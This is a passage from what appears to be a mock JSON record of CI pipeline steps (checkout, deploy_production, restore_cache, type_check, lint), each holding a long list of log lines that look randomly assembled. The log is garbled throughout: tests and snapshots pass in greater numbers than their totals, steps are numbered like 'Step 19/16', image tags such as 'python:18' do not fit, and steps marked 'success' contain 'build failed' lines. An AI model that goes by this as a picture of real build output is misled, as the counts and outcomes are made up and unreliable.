          "Processing...",
          "npm notice: package.json updated",
          "\u2717 build failed with exit code 54",
          "[12:46:53] INFO: Connecting to database",
          "Ran 131 tests in 54s",
          "Step 13/18: Building",
          "Snapshots: 9 passed, 16 total",
          "[12:46:53] DEBUG: Connection pool: 20 active",
          "Artifact uploaded: build.tar.gz (2MB)",
          "npm notice: package.json updated",
          "\u2717 build failed with exit code 82",
          "\u2713 All checks passed",
          "Step 14/19: Running migrations",
          "Pulling image: python:latest",
          "Using Python 3.9",
          "[12:46:53] INFO: Request completed",
          "Cache hit for key-5289",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Test Suites: 26 passed, 43 total",
          "Artifact uploaded: build.tar.gz (1MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: created a lockfile",
          "FAILED: test_db_connect",
          "Pulling image: python:18",
          "Snapshots: 25 passed, 6 total",
          "Step 15/17: Testing",
          "HEAD is now at 359595e",
          "Tests: 344 passed, 289 total",
          "[12:46:53] WARN: Deprecated API usage",
          "Switched to branch 'feature/task-450'",
          "[12:46:53] INFO: Processing request",
          "Fetching from https://amazonaws.com/package.json",
          "Installing lodash@4.16.9",
          "Building Docker image...",
          "Pushing to registry...",
          "Connection established",
          "\u2713 Task completed in 3890ms",
          "[12:46:53] DEBUG: Memory usage: 854MB",
          "\u2713 Step 'checkout' succeeded",
          "Verifying...",
          "Bundling runtime.js",
          "[12:46:53] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Waiting...",
          "Exception: ValueError",
          "Step 15/23: Installing dependencies",
          "Step 1/17: Testing",
          "Layer 8/10: RUN command",
          "[12:46:53] INFO: Starting build process",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-10T12:47:47.218711",
        "finished_at": "2025-12-10T12:47:53.237832",
        "log_lines": [
          "=== Step: checkout ===",
          "Processing...",
          "[12:46:53] ERROR: Connection failed",
          "Pulling image: node:18",
          "Compiling utils/utils.go...",
          "Using Python 3.9",
          "pip: Installing build dependencies...",
          "Snapshots: 39 passed, 16 total",
          "[12:46:53] DEBUG: Loading configuration",
          "[12:46:53] ERROR: Connection failed",
          "Loading...",
          "Compiling components/utils.go...",
          "NODE_ENV=test",
          "Compiling components/app.ts...",
          "Step 7/21: Deploying",
          "pip: Downloading eslint-3.10.tar.gz",
          "[12:46:53] DEBUG: Query executed in 47ms",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Minifying main.js",
          "pip install: Successfully installed react-2.13",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Optimizing 92 modules...",
          "pip: Collecting react",
          "POST /data - 200 (119ms)",
          "[12:46:53] INFO: Processing request",
          "Ran 101 tests in 45s",
          "Minifying main.js",
          "Pushing to registry...",
          "pip: Downloading jest-5.4.tar.gz",
          "Fetching submodules...",
          "[12:46:53] INFO: Starting build process",
          "Building Docker image...",
          "Using Python 3.9",
          "Waiting...",
          "Ready.",
          "Optimizing 16 modules...",
          "npm install: resolved 1992 packages",
          "Step 13/25: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: express has known vulnerabilities",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling lib/handler.rs...",
          "[12:46:53] DEBUG: Query executed in 51ms",
          "POST /api - 200 (457ms)",
          "yarn add: Done in 5.25s",
          "Checking out main branch",
          "Using Node.js 19.18.7",
          "Cache restored successfully (336MB)",
          "Creating production build...",
          "Step 18/19: Testing",
          "[12:46:53] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Cache invalidated: node_modules",
          "  PASS: e2e/test_api_health.spec.js",
          "Step 4/18: Building",
          "Connection established",
          "Using Node.js 16.11.9",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Coverage: 92% statements, 79% branches",
          "Success!",
          "Artifact uploaded: dist.zip (10MB)",
          "Ready.",
          "[12:46:53] INFO: Processing request",
          "pip: Collecting jest",
          "Time: 116.742s",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "Verifying...",
          "GET /status - 200 (11ms)",
          "Fetching submodules...",
          "npm install: added 413 packages",
          "[12:46:53] INFO: Starting build process",
          "Cache saved successfully",
          "Image pulled successfully",
          "Platform: darwin-arm64",
          "POST /upload - 200 (304ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:53] INFO: Starting build process",
          "[12:46:53] DEBUG: Memory usage: 1478MB",
          "\u2713 Step 'setup' succeeded",
          "[12:46:53] INFO: Request completed",
          "Creating production build...",
          "Pulling image: node:latest",
          "Processing...",
          "Creating production build...",
          "[12:46:53] DEBUG: Loading configuration",
          "[12:46:53] INFO: Processing request",
          "FAILED: test_api_health",
          "Pushing to registry...",
          "[12:46:53] INFO: Processing request",
          "Cache miss for key-6960",
          "npm install: resolved 1622 packages",
          "\u2717 build failed with exit code 70",
          "Snapshots: 49 passed, 1 total",
          "[12:46:53] DEBUG: Memory usage: 492MB",
          "WARNING: jest has known vulnerabilities",
          "Uploading artifact 'build' (23 files)",
          "Processing...",
          "Compiling components/utils.go...",
          "Step 12/16: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Task completed in 2467ms",
          "Test Suites: 32 passed, 15 total",
          "[12:46:53] INFO: Cache refreshed",
          "[12:46:53] WARN: Deprecated API usage",
          "Installing jest@4.20.3",
          "[12:46:53] INFO: Starting build process",
          "[12:46:53] DEBUG: Query executed in 62ms",
          "Image pulled successfully",
          "Minifying main.js",
          "Exception: ValueError",
          "NODE_ENV=development",
          "Tests: 308 passed, 290 total",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-3525",
          "POST /api - 202 (283ms)",
          "  PASS: integration/test_cache_hit.spec.js",
          "Cache restored successfully (97MB)",
          "\u2713 validate completed",
          "Loading...",
          "Step 5/23: Building",
          "HEAD is now at f89b568",
          "yarn add: Done in 17.23s",
          "[12:46:53] DEBUG: Connection pool: 16 active",
          "pip: Collecting express",
          "Fetching from https://googleapis.com/package.json",
          "Using Node.js 19.0.2",
          "Connection established",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "Exception: ValueError",
          "GET /status - 200 (82ms)",
          "pip: Downloading eslint-2.9.tar.gz",
          "Creating production build...",
          "Image pulled successfully",
          "Tests: 222 passed, 71 total",
          "  PASS: test_db_connect (437ms)",
          "Snapshots: 19 passed, 25 total",
          "Checking out main branch",
          "Done.",
          "Exception: ValueError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling components/handler.rs...",
          "Installing express@1.8.6",
          "Step 6/25: Linting",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Time: 47.664s",
          "\u2713 Step 'install' succeeded",
          "WARNING: webpack has known vulnerabilities",
          "Transforming 993 files...",
          "Fetching from https://docker.io/package.json",
          "[12:46:53] DEBUG: Initializing service",
          "TLS handshake completed",
          "Already up to date.",
          "Cache miss for key-4451",
          "Building Docker image...",
          "Switched to branch 'feature/task-618'",
          "pip: Downloading webpack-4.20.tar.gz",
          "npm notice: package.json updated",
          "[12:46:53] DEBUG: Initializing service",
          "[12:46:53] INFO: Starting build process",
          "npm install: added 472 packages",
          "Tests: 324 passed, 162 total",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "Step 1/22: Installing dependencies",
          "Time: 29.241s",
          "Artifact uploaded: dist.zip (47MB)",
          "Using Node.js 20.0.0",
          "Minifying app.js",
          "Cache hit for key-1570",
          "Bundling vendor.js",
          "Compiling utils/service.java...",
          "Step 12/17: Installing dependencies",
          "OK",
          "pip install: Successfully installed lodash-5.15",
          "[12:46:53] DEBUG: Memory usage: 906MB",
          "Environment: staging",
          "Connection established",
          "Loading...",
          "Environment: staging",
          "Creating production build...",
          "OK",
          "Step 16/20: Linting",
          "Artifact downloaded: 33MB",
          "Compiling src/app.ts...",
          "\u2717 build failed with exit code 61",
          "[12:46:53] DEBUG: Query executed in 100ms",
          "Done.",
          "\u2713 Step 'install' succeeded",
          "[12:46:53] INFO: Request completed",
          "Fetching submodules...",
          "Using Python 3.10",
          "Already up to date.",
          "Pushing to registry...",
          "Fetching submodules...",
          "Step 3/16: Installing dependencies",
          "Platform: darwin-arm64",
          "Finished.",
          "Bundling runtime.js",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-10T12:47:53.237832",
        "finished_at": "2025-12-10T12:47:59.256953",
        "log_lines": [
          "=== Step: deploy_production ===",
          "[12:46:53] DEBUG: Query executed in 41ms",
          "Pushing to registry...",
          "TLS handshake completed",
          "  PASS: test_auth_login (61ms)",
          "pip: Installing build dependencies...",
          "Step 8/23: Installing dependencies",
          "Connection established",
          "POST /upload - 201 (494ms)",
          "Bundling runtime.js",
          "pip: Downloading lodash-1.10.tar.gz",
          "Uploading artifact 'coverage' (7 files)",
          "Fetching from https://gcr.io/package.json",
          "[12:46:53] ERROR: Connection failed",
          "Done.",
          "Artifact uploaded: build.tar.gz (50MB)",
          "GET /api - 200 (54ms)",
          "pip install: Successfully installed jest-1.1",
          "[12:46:53] DEBUG: Initializing service",
          "FAILED: test_api_health",
          "\u2713 package completed",
          "Environment: test",
          "\u2713 Task completed in 4801ms",
          "Done.",
          "\u2713 build completed",
          "Layer 2/14: RUN command",
          "[12:46:53] DEBUG: Query executed in 21ms",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "yarn add: Done in 17.29s",
          "  PASS: test_api_health (49ms)",
          "Compiling lib/app.ts...",
          "[12:46:53] WARN: Deprecated API usage",
          "pip: Collecting react",
          "Generating source maps...",
          "Compiling utils/utils.go...",
          "Pushing to registry...",
          "Generating source maps...",
          "HEAD is now at b33bc49",
          "Step 2/22: Building",
          "OK",
          "[12:46:53] INFO: Cache refreshed",
          "pip: Downloading eslint-5.7.tar.gz",
          "Cache saved successfully",
          "Using Python 3.11",
          "Cache hit for key-2186",
          "Time: 112.822s",
          "  PASS: integration/test_user_create.spec.js",
          "[12:46:53] DEBUG: Connection pool: 2 active",
          "Snapshots: 18 passed, 21 total",
          "HEAD is now at 54284b7",
          "Compiling utils/utils.go...",
          "HEAD is now at 8698854",
          "pip install: Successfully installed jest-2.15",
          "[12:46:53] WARN: Deprecated API usage",
          "Creating production build...",
          "npm install: resolved 354 packages",
          "Test Suites: 34 passed, 36 total",
          "Test Suites: 37 passed, 5 total",
          "[12:46:53] DEBUG: Loading configuration",
          "[12:46:53] DEBUG: Initializing service",
          "Minifying main.js",
          "TLS handshake completed",
          "Bundling runtime.css",
          "Layer 2/10: ENV command",
          "HEAD is now at 1f5af61",
          "Connection established",
          "Cache restored successfully (448MB)",
          "NODE_ENV=development",
          "Step 2/23: Testing",
          "Transforming 629 files...",
          "Cache miss for key-6081",
          "Success!",
          "Minifying vendor.js",
          "Step 7/23: Linting",
          "Cache saved successfully",
          "Loading...",
          "Fetching submodules...",
          "[12:46:53] INFO: Processing request",
          "Uploading artifact 'dist' (13 files)",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: dist.zip (61MB)",
          "Cache restored successfully (23MB)",
          "Waiting...",
          "Cache restored successfully (40MB)",
          "\u2713 All checks passed",
          "Ran 32 tests in 60s",
          "Generating source maps...",
          "\u2713 All checks passed",
          "\u2713 Task completed in 535ms",
          "Using Python 3.9",
          "HEAD is now at 300595b",
          "Environment: staging",
          "pip install: Successfully installed jest-3.2",
          "Layer 6/9: COPY command",
          "Already up to date.",
          "FAILED: test_user_create",
          "[12:46:53] DEBUG: Connection pool: 15 active",
          "[12:46:53] DEBUG: Loading configuration",
          "[12:46:53] WARN: Deprecated API usage",
          "pip: Collecting react",
          "pip: Collecting jest",
          "Artifact downloaded: 18MB",
          "Fetching from https://github.com/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Downloading eslint-3.18.tar.gz",
          "OK",
          "Using Python 3.12",
          "Time: 80.359s",
          "Uploading artifact 'dist' (16 files)",
          "\u2713 All checks passed",
          "Environment: production",
          "Ready.",
          "Time: 96.896s",
          "Compiling utils/utils.go...",
          "Installing express@3.15.0",
          "Bundling main.js",
          "npm install: added 280 packages",
          "Processing...",
          "Artifact uploaded: dist.zip (69MB)",
          "Step 11/23: Deploying",
          "pip: Installing build dependencies...",
          "Compiling components/app.ts...",
          "\u2713 All checks passed",
          "Compiling components/service.java...",
          "npm install: resolved 1274 packages",
          "Compiling src/handler.rs...",
          "Using Python 3.10",
          "Bundling runtime.css",
          "npm notice: package.json updated",
          "Artifact uploaded: dist.zip (41MB)",
          "\u2713 Task completed in 2822ms",
          "TLS handshake completed",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:53] INFO: Processing request",
          "npm install: resolved 708 packages",
          "Cache restored successfully (115MB)",
          "Tests: 376 passed, 464 total",
          "Platform: linux-x64",
          "HEAD is now at 2e1adff",
          "Minifying main.js",
          "[12:46:53] DEBUG: Initializing service",
          "[12:46:53] DEBUG: Initializing service",
          "\u2713 All checks passed",
          "  PASS: test_user_create (54ms)",
          "Step 10/20: Testing",
          "[12:46:53] DEBUG: Initializing service",
          "Test Suites: 15 passed, 21 total",
          "Step 17/18: Building",
          "Minifying vendor.js",
          "\u2717 build failed with exit code 119",
          "[12:46:53] WARN: Deprecated API usage",
          "Connection established",
          "pip install: Successfully installed axios-3.5",
          "Waiting...",
          "Installing prettier@3.18.10",
          "Step 12/23: Installing dependencies",
          "\u2713 Step 'install' succeeded",
          "Compiling lib/utils.go...",
          "[12:46:53] INFO: Processing request",
          "[12:46:53] ERROR: Connection failed",
          "Step 2/25: Installing dependencies",
          "pip: Installing build dependencies...",
          "Minifying main.js",
          "Checking out master branch",
          "Building Docker image...",
          "Time: 32.518s",
          "Cache hit for key-7945",
          "FAILED: test_db_connect",
          "[12:46:53] DEBUG: Initializing service",
          "Transforming 780 files...",
          "Compiling lib/app.ts...",
          "Environment: development",
          "yarn add: Done in 8.41s",
          "Snapshots: 30 passed, 40 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /data - 200 (42ms)",
          "OK",
          "Switched to branch 'feature/task-307'",
          "\u2713 validate completed",
          "TLS handshake completed",
          "Verifying...",
          "Creating production build...",
          "Cache invalidated: dependencies",
          "[12:46:53] DEBUG: Loading configuration",
          "[12:46:53] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (349ms)",
          "[12:46:53] INFO: Processing request",
          "pip: Installing build dependencies...",
          "[12:46:53] DEBUG: Memory usage: 1367MB",
          "Exception: RuntimeError",
          "\u2713 Task completed in 3029ms",
          "Using Python 3.10",
          "HEAD is now at 0c4ab9e",
          "Cache hit for key-6393",
          "Step 2/23: Building",
          "Tests: 255 passed, 481 total",
          "Test Suites: 18 passed, 30 total",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Creating production build...",
          "[12:46:53] DEBUG: Query executed in 78ms",
          "Finished.",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-10T12:47:59.256953",
        "finished_at": "2025-12-10T12:48:08.285635",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Loading...",
          "Artifact downloaded: 20MB",
          "npm install: resolved 814 packages",
          "\u2713 deploy completed",
          "Creating production build...",
          "  PASS: e2e/test_user_create.spec.js",
          "\u2713 Step 'install' succeeded",
          "Checking out main branch",
          "Cache restored successfully (237MB)",
          "OK",
          "Minifying main.js",
          "Layer 10/10: ENV command",
          "Cache miss for key-9655",
          "pip: Downloading prettier-5.5.tar.gz",
          "pip: Downloading react-3.9.tar.gz",
          "Step 4/25: Testing",
          "HEAD is now at c28f198",
          "Pulling image: node:latest",
          "Snapshots: 36 passed, 37 total",
          "Step 7/23: Testing",
          "  PASS: test_cache_hit (48ms)",
          "Ready.",
          "Step 16/23: Testing",
          "Success!",
          "Step 19/16: Installing dependencies",
          "GET /status - 201 (46ms)",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "FAILED: test_db_connect",
          "GET /api - 201 (28ms)",
          "Processing...",
          "Layer 8/8: COPY command",
          "Step 10/20: Installing dependencies",
          "Verifying...",
          "POST /upload - 202 (376ms)",
          "npm install: resolved 739 packages",
          "Compiling utils/utils.go...",
          "Checking out master branch",
          "Step 19/25: Installing dependencies",
          "npm notice: package.json updated",
          "Using Python 3.9",
          "TLS handshake completed",
          "Building Docker image...",
          "Optimizing 92 modules...",
          "Test Suites: 16 passed, 30 total",
          "Test Suites: 23 passed, 10 total",
          "Switched to branch 'hotfix/task-110'",
          "Cache saved successfully",
          "Ran 40 tests in 28s",
          "[12:46:53] INFO: Request completed",
          "GET /health - 201 (1ms)",
          "[12:46:53] DEBUG: Loading configuration",
          "Bundling runtime.css",
          "Switched to branch 'hotfix/task-177'",
          "  PASS: test_auth_login (151ms)",
          "Compiling components/app.ts...",
          "Done.",
          "  PASS: test_api_health (152ms)",
          "Already up to date.",
          "[12:46:53] INFO: Processing request",
          "Ready.",
          "HEAD is now at 1ce11ff",
          "OK",
          "[12:46:53] WARN: Deprecated API usage",
          "[12:46:53] DEBUG: Loading configuration",
          "HEAD is now at 6ce6961",
          "yarn add: Done in 3.54s",
          "Checking out main branch",
          "Step 19/15: Running migrations",
          "GET /health - 204 (41ms)",
          "[12:46:53] WARN: Deprecated API usage",
          "Minifying app.js",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "[12:46:53] DEBUG: Memory usage: 612MB",
          "Platform: win32-x64",
          "Creating production build...",
          "GET /status - 201 (92ms)",
          "Completed.",
          "Optimizing 44 modules...",
          "Processing...",
          "[12:46:53] WARN: Deprecated API usage",
          "Switched to branch 'bugfix/task-885'",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 11/21: Building",
          "Fetching submodules...",
          "Fetching submodules...",
          "NODE_ENV=development",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Checking out main branch",
          "[12:46:53] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "npm notice: created a lockfile",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: dist.zip (22MB)",
          "Uploading artifact 'coverage' (29 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "Compiling utils/utils.go...",
          "npm notice: created a lockfile",
          "[12:46:53] DEBUG: Initializing service",
          "  PASS: test_user_create (95ms)",
          "Connection established",
          "Cache saved successfully",
          "Fetching submodules...",
          "  PASS: test_user_create (91ms)",
          "Fetching from https://gcr.io/package.json",
          "Processing...",
          "Environment: development",
          "Layer 9/13: COPY command",
          "Optimizing 90 modules...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:46:53] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Minifying main.js",
          "  PASS: e2e/test_auth_login.spec.js",
          "pip: Collecting jest",
          "OK",
          "Fetching from https://googleapis.com/package.json",
          "Creating production build...",
          "WARNING: axios has known vulnerabilities",
          "Success!",
          "NODE_ENV=production",
          "[12:46:53] DEBUG: Loading configuration",
          "Coverage: 81% statements, 66% branches",
          "Tests: 247 passed, 63 total",
          "Ready.",
          "\u2713 deploy completed",
          "[12:46:53] INFO: Starting build process",
          "[12:46:53] DEBUG: Memory usage: 1945MB",
          "Installing express@3.10.1",
          "Bundling vendor.css",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Generating source maps...",
          "Transforming 208 files...",
          "Processing...",
          "\u2713 Step 'test' succeeded",
          "\u2713 Task completed in 2271ms",
          "[12:46:53] WARN: Deprecated API usage",
          "Waiting...",
          "Done.",
          "\u2713 Step 'setup' succeeded",
          "Snapshots: 43 passed, 2 total",
          "npm install: added 184 packages",
          "\u2713 All checks passed",
          "Snapshots: 31 passed, 21 total",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling lib/utils.go...",
          "Cache hit for key-1657",
          "Cache saved successfully",
          "npm install: added 319 packages",
          "Connection established",
          "GET /health - 204 (55ms)",
          "pip: Downloading axios-2.3.tar.gz",
          "Exception: TypeError",
          "npm notice: package.json updated",
          "pip install: Successfully installed jest-5.12",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Success!",
          "[12:46:53] ERROR: Connection failed",
          "Step 9/20: Linting",
          "Snapshots: 9 passed, 5 total",
          "[12:46:53] DEBUG: Connection pool: 16 active",
          "Using Python 3.9",
          "Pulling image: node:3.11",
          "Done.",
          "Exception: TypeError",
          "Done.",
          "[12:46:53] INFO: Request completed",
          "[12:46:53] INFO: Connecting to database",
          "GET /api - 200 (75ms)",
          "[12:46:53] DEBUG: Loading configuration",
          "Connection established",
          "[12:46:53] INFO: Request completed",
          "Environment: development",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:53] WARN: Deprecated API usage",
          "npm install: resolved 1498 packages",
          "\u2713 package completed",
          "npm install: resolved 1826 packages",
          "Fetching submodules...",
          "Compiling utils/service.java...",
          "Finished.",
          "Coverage: 80% statements, 92% branches",
          "Pulling image: python:18",
          "OK",
          "\u2713 test completed",
          "[12:46:53] WARN: Deprecated API usage",
          "\u2713 Task completed in 1785ms",
          "Building Docker image...",
          "[12:46:53] DEBUG: Connection pool: 16 active",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:46:53] INFO: Request completed",
          "yarn add: Done in 3.39s",
          "Checking out develop branch",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "  PASS: e2e/test_db_connect.spec.js",
          "\u2713 test completed",
          "Step 13/20: Building",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-10T12:48:08.285635",
        "finished_at": "2025-12-10T12:48:23.333438",
        "log_lines": [
          "=== Step: type_check ===",
          "Completed.",
          "\u2713 deploy completed",
          "Loading...",
          "Cache saved successfully",
          "[12:46:53] WARN: Deprecated API usage",
          "Bundling vendor.js",
          "Optimizing 38 modules...",
          "npm notice: package.json updated",
          "FAILED: test_cache_hit",
          "Uploading artifact 'build' (50 files)",
          "npm install: added 79 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing webpack@3.7.0",
          "Fetching from https://amazonaws.com/package.json",
          "Uploading artifact 'build' (9 files)",
          "npm install: added 488 packages",
          "[12:46:53] WARN: Deprecated API usage",
          "yarn add: Done in 29.27s",
          "Fetching from https://github.com/package.json",
          "TLS handshake completed",
          "Ran 62 tests in 43s",
          "Uploading artifact 'build' (8 files)",
          "Checking out master branch",
          "Minifying main.js",
          "Pushing to registry...",
          "Pushing to registry...",
          "\u2713 test completed",
          "Cache restored successfully (281MB)",
          "npm notice: package.json updated",
          "Building Docker image...",
          "  PASS: e2e/test_api_health.spec.js",
          "Processing...",
          "Finished.",
          "[12:46:53] DEBUG: Loading configuration",
          "[12:46:53] INFO: Cache refreshed",
          "\u2713 Task completed in 2169ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling lib/utils.go...",
          "  PASS: integration/test_api_health.spec.js",
          "[12:46:53] INFO: Request completed",
          "Pushing to registry...",
          "Platform: linux-x64",
          "GET /status - 204 (7ms)",
          "Cache hit for key-9140",
          "Snapshots: 9 passed, 13 total",
          "Step 7/19: Linting",
          "Already up to date.",
          "Loading...",
          "TLS handshake completed",
          "Cache restored successfully (245MB)",
          "Step 18/21: Linting",
          "Cache restored successfully (362MB)",
          "Using Node.js 15.16.7",
          "Environment: production",
          "Bundling styles.js",
          "Layer 8/15: COPY command",
          "Cache invalidated: node_modules",
          "Optimizing 77 modules...",
          "Test Suites: 27 passed, 30 total",
          "Pushing to registry...",
          "POST /api - 200 (129ms)",
          "Transforming 565 files...",
          "Success!",
          "Switched to branch 'bugfix/task-872'",
          "Step 2/25: Testing",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Processing...",
          "Snapshots: 11 passed, 36 total",
          "Done.",
          "Ran 54 tests in 39s",
          "npm install: added 255 packages",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "Fetching from https://amazonaws.com/package.json",
          "pip install: Successfully installed lodash-5.20",
          "\u2713 build completed",
          "Tests: 442 passed, 123 total",
          "npm install: added 361 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 48 passed, 11 total",
          "Environment: development",
          "[12:46:53] DEBUG: Memory usage: 365MB",
          "[12:46:53] INFO: Cache refreshed",
          "\u2713 package completed",
          "Coverage: 81% statements, 66% branches",
          "[12:46:53] DEBUG: Memory usage: 1690MB",
          "[12:46:53] WARN: Deprecated API usage",
          "Connection established",
          "Verifying...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "WARNING: jest has known vulnerabilities",
          "Layer 8/11: COPY command",
          "Snapshots: 35 passed, 3 total",
          "[12:46:53] INFO: Request completed",
          "pip: Installing build dependencies...",
          "pip: Downloading react-3.1.tar.gz",
          "[12:46:53] DEBUG: Initializing service",
          "Processing...",
          "Uploading artifact 'coverage' (10 files)",
          "[12:46:53] ERROR: Connection failed",
          "Fetching submodules...",
          "Optimizing 46 modules...",
          "Connection established",
          "Uploading artifact 'dist' (17 files)",
          "Already up to date.",
          "npm install: resolved 966 packages",
          "[12:46:53] INFO: Connecting to database",
          "Using Python 3.11",
          "WARNING: prettier has known vulnerabilities",
          "NODE_ENV=development",
          "Cache invalidated: build",
          "Step 9/21: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "Waiting...",
          "Cache saved successfully",
          "WARNING: jest has known vulnerabilities",
          "Fetching from https://gcr.io/package.json",
          "Step 19/15: Linting",
          "pip: Installing build dependencies...",
          "Transforming 382 files...",
          "Coverage: 97% statements, 62% branches",
          "  PASS: test_api_health (321ms)",
          "pip: Installing build dependencies...",
          "\u2713 validate completed",
          "  PASS: integration/test_api_health.spec.js",
          "[12:46:53] DEBUG: Query executed in 91ms",
          "GET /health - 201 (73ms)",
          "Step 5/21: Installing dependencies",
          "Using Python 3.10",
          "Compiling src/utils.go...",
          "npm install: resolved 1838 packages",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 9/20: Running migrations",
          "  PASS: test_api_health (426ms)",
          "Artifact uploaded: dist.zip (41MB)",
          "Transforming 947 files...",
          "[12:46:53] INFO: Cache refreshed",
          "  PASS: e2e/test_auth_login.spec.js",
          "Checking out main branch",
          "[12:46:53] DEBUG: Query executed in 74ms",
          "pip install: Successfully installed webpack-3.8",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache restored successfully (281MB)",
          "Pushing to registry...",
          "[12:46:53] INFO: Connecting to database",
          "Cache invalidated: build",
          "[12:46:53] DEBUG: Initializing service",
          "[12:46:53] DEBUG: Connection pool: 11 active",
          "Connection established",
          "Environment: development",
          "Already up to date.",
          "npm notice: package.json updated",
          "Compiling lib/index.js...",
          "[12:46:53] INFO: Request completed",
          "Building Docker image...",
          "[12:46:53] INFO: Processing request",
          "Switched to branch 'bugfix/task-306'",
          "Using Python 3.11",
          "\u2713 validate completed",
          "Completed.",
          "Coverage: 90% statements, 65% branches",
          "[12:46:53] DEBUG: Memory usage: 1191MB",
          "OK",
          "Cache saved successfully",
          "Cache saved successfully",
          "Connection established",
          "npm install: added 145 packages",
          "[12:46:53] DEBUG: Query executed in 33ms",
          "Artifact downloaded: 4MB",
          "Snapshots: 8 passed, 44 total",
          "Ran 68 tests in 29s",
          "Success!",
          "TLS handshake completed",
          "Coverage: 91% statements, 73% branches",
          "Connection established",
          "[12:46:53] DEBUG: Connection pool: 12 active",
          "Success!",
          "Success!",
          "Building Docker image...",
          "Processing...",
          "Compiling utils/index.js...",
          "Environment: test",
          "Optimizing 24 modules...",
          "Step 5/25: Building",
          "Bundling vendor.js",
          "[12:46:53] WARN: Deprecated API usage",
          "npm install: added 465 packages",
          "Step 14/22: Installing dependencies",
          "Coverage: 89% statements, 81% branches",
          "Artifact downloaded: 47MB",
          "Minifying vendor.js",
          "Environment: staging",
          "POST /api - 200 (415ms)",
          "npm install: added 282 packages",
          "Cache invalidated: node_modules",
          "Compiling components/app.ts...",
          "Loading...",
          "HEAD is now at 7822f73",
          "\u2713 Task completed in 897ms",
          "Pulling image: alpine:3.11",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-10T12:48:23.333438",
        "finished_at": "2025-12-10T12:48:38.381241",
        "log_lines": [
          "=== Step: lint ===",
          "Layer 6/14: COPY command",
          "Step 6/23: Installing dependencies",
          "Step 14/23: Running migrations",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_cache_hit (75ms)",
          "npm install: resolved 814 packages",
          "Coverage: 77% statements, 67% branches",
          "Step 2/17: Running migrations",
          "[12:46:53] WARN: Deprecated API usage",
          "\u2713 Task completed in 859ms",
          "Time: 119.516s",
          "Time: 41.74s",
          "Checking out master branch",
          "Cache hit for key-1636",
          "[12:46:53] DEBUG: Loading configuration",
          "Cache saved successfully",
          "\u2713 validate completed",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 23 modules...",
          "Processing...",
          "Image pulled successfully",
          "NODE_ENV=development",
          "Step 9/21: Linting",
          "Step 12/23: Building",
          "[12:46:53] WARN: Deprecated API usage",
          "Processing...",
          "[12:46:53] WARN: Deprecated API usage",
          "Using Python 3.11",
          "Cache hit for key-8917",
          "pip install: Successfully installed eslint-5.8",
          "Pulling image: node:latest",
          "Transforming 467 files...",
          "[12:46:53] ERROR: Connection failed",
          "[12:46:53] INFO: Request completed",
